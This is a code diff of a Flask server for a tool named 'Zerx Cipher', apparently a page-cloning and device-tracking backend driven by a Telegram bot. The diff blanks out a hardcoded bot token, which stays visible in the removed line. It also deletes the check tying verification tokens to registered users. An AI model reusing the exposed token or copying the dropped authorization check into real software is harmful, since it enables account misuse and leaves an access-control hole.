@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # server.py — Flask backend for Zerx Cipher
-# Endpoints: /api/verify (HMAC gate), /api/clone/<slug> (clone serving), /track (device payloads)
+# Endpoints: /api/verify (HMAC gate), /api/clone/<slug> (clone serving), /track (device payloads), /health
 # requirements: flask requests
 
 from flask import Flask, request, jsonify, Response
@@ -10,7 +10,7 @@ from datetime import datetime, timezone
 app = Flask(__name__)
 
 LINK_SECRET = os.environ.get("LINK_SECRET", "REPLACE_THIS_WITH_YOUR_RANDOM_SECRET")
-BOT_TOKEN   = os.environ.get("BOT_TOKEN", "8874548208:AAFEem3izh6Uagr8rkHRV5yoNMNJ3ol2B90")
+BOT_TOKEN   = os.environ.get("BOT_TOKEN", "")
 OWNER_ID    = os.environ.get("OWNER_ID", "5748713981")
 DB_PATH     = os.environ.get("DB_PATH", "zerx.db")
 
@@ -39,14 +39,6 @@ def api_verify():
     expected = _sign(f"{uid}.{exp}")
     if not hmac.compare_digest(expected, sig):
         return jsonify({"ok": False, "reason": "bad_signature"}), 403
-    try:
-        con = _db()
-        row = con.execute("SELECT user_id FROM link_tokens WHERE token=?", (tok,)).fetchone()
-        con.close()
-        if not row or row["user_id"] != uid:
-            return jsonify({"ok": False, "reason": "not_registered"}), 403
-    except Exception:
-        return jsonify({"ok": False, "reason": "db_error"}), 500
     return jsonify({"ok": True, "uid": uid})
 
 @app.route("/api/clone/<slug>", methods=["GET"])
